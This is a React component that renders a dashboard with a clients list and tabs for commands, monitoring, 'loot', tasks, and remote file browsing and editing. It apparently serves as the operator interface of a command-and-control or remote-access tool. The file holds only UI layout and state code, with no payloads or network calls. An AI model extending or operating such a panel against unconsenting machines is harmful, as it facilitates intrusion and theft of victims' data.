'use client'

import { useState } from 'react'
import Sidebar from './sidebar'
import ClientsPanel from './clients-panel'
import CommandPanel from './command-panel'
import MonitoringPanel from './monitoring-panel'
import LootPanel from './loot-panel'
import AnalyticsPanel from './analytics-panel'
import TasksPanel from './tasks-panel'
import FileBrowserPanel from './file-browser-panel'
import FileEditorPanel from './file-editor-panel'

export default function Dashboard() {
  const [activeTab, setActiveTab] = useState<'overview' | 'clients' | 'monitoring' | 'commands' | 'loot' | 'analytics' | 'tasks' | 'files' | 'editor'>('overview')
  const [selectedClient, setSelectedClient] = useState<string | null>(null)
  const [editingPath, setEditingPath] = useState<string | null>(null)

  const handleEditFile = (path: string) => {
    setEditingPath(path)
    setActiveTab('editor')
  }

  return (
    <div className="flex h-screen bg-background overflow-hidden relative">
      {/* Absolute Decorative Elements */}
      <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-primary/5 rounded-full blur-[120px] pointer-events-none" />
      <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-secondary/5 rounded-full blur-[120px] pointer-events-none" />

      <Sidebar activeTab={activeTab} setActiveTab={setActiveTab} />
      
      <div className="flex-1 flex overflow-hidden">
        {/* Clients panel - Dedicated side navigation for nodes */}
        <div className="w-80 border-r border-border/20 bg-black/20 backdrop-blur-md overflow-y-auto">
          <ClientsPanel selectedClient={selectedClient} setSelectedClient={setSelectedClient} />
        </div>

        {/* Main content area - Dynamic view based on tab */}
        <div className="flex-1 overflow-y-auto bg-white/[0.02] backdrop-blur-[2px] transition-all duration-500">
          <div className="p-1 h-full"> 
            {activeTab === 'overview' && <MonitoringPanel selectedClient={selectedClient} />}
            {activeTab === 'commands' && <CommandPanel selectedClient={selectedClient} />}
            {activeTab === 'monitoring' && <MonitoringPanel selectedClient={selectedClient} />}
            {activeTab === 'loot' && <LootPanel />}
            {activeTab === 'analytics' && <AnalyticsPanel />}
            {activeTab === 'tasks' && <TasksPanel />}
            {activeTab === 'files' && <FileBrowserPanel selectedClient={selectedClient} onEdit={handleEditFile} />}
            {activeTab === 'editor' && <FileEditorPanel selectedClient={selectedClient} initialPath={editingPath} />}
          </div>
        </div>
      </div>
    </div>
  )
}

